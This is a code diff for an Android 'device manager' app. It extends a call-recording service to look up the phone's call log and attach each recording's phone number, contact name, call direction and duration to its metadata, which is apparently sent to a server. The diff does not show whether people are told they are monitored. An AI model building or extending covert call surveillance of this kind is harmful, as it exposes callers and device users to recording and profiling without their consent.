@@ -3,8 +3,10 @@ package com.company.devicemgr.services;
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.media.MediaRecorder;
 import android.os.IBinder;
+import android.provider.CallLog;
 import android.util.Log;
 
 import com.company.devicemgr.utils.ApiConfig;
@@ -184,6 +186,13 @@ public class CallRecordingService extends Service {
                     metadata.put("transport", "audio_mp4");
                     metadata.put("capturedAtMs", startedAtMs);
                     metadata.put("callStartedAtMs", startedAtMs);
+                    JSONObject callContext = lookupNearestCallContext(startedAtMs);
+                    if (callContext != null) {
+                        metadata.put("callNumber", callContext.optString("number", null));
+                        metadata.put("callContactName", callContext.optString("contactName", null));
+                        metadata.put("callDirection", callContext.optString("direction", null));
+                        metadata.put("callDurationSeconds", callContext.optLong("duration", 0L));
+                    }
                     if (row != null) {
                         metadata.put("audioSource", row.optInt("audioSource", -1));
                         metadata.put("sizeBytes", row.optLong("sizeBytes", f.length()));
@@ -218,5 +227,55 @@ public class CallRecordingService extends Service {
     @Override
     public IBinder onBind(Intent intent) {
         return null;
+    }
+
+    private JSONObject lookupNearestCallContext(long startedAtMs) {
+        if (startedAtMs <= 0L) return null;
+        try {
+            Cursor cursor = getContentResolver().query(
+                    CallLog.Calls.CONTENT_URI,
+                    new String[]{
+                            CallLog.Calls.NUMBER,
+                            CallLog.Calls.CACHED_NAME,
+                            CallLog.Calls.TYPE,
+                            CallLog.Calls.DURATION,
+                            CallLog.Calls.DATE
+                    },
+                    null,
+                    null,
+                    CallLog.Calls.DATE + " DESC"
+            );
+            if (cursor == null) return null;
+            try {
+                while (cursor.moveToNext()) {
+                    long callTs = cursor.getLong(4);
+                    if (Math.abs(callTs - startedAtMs) > 15 * 60 * 1000L) continue;
+                    JSONObject out = new JSONObject();
+                    out.put("number", cursor.getString(0));
+                    out.put("contactName", cursor.getString(1));
+                    out.put("direction", callDirectionLabel(cursor.getInt(2)));
+                    out.put("duration", cursor.getLong(3));
+                    out.put("ts", callTs);
+                    return out;
+                }
+            } finally {
+                cursor.close();
+            }
+        } catch (SecurityException se) {
+            Log.w(TAG, "lookupNearestCallContext missing permission", se);
+        } catch (Exception e) {
+            Log.e(TAG, "lookupNearestCallContext err", e);
+        }
+        return null;
+    }
+
+    private String callDirectionLabel(int type) {
+        if (type == CallLog.Calls.INCOMING_TYPE) return "Recebida";
+        if (type == CallLog.Calls.OUTGOING_TYPE) return "Efetuada";
+        if (type == CallLog.Calls.MISSED_TYPE) return "Perdida";
+        if (type == CallLog.Calls.REJECTED_TYPE) return "Rejeitada";
+        if (type == CallLog.Calls.BLOCKED_TYPE) return "Bloqueada";
+        if (type == CallLog.Calls.VOICEMAIL_TYPE) return "Voicemail";
+        return "Desconhecida";
     }
 }
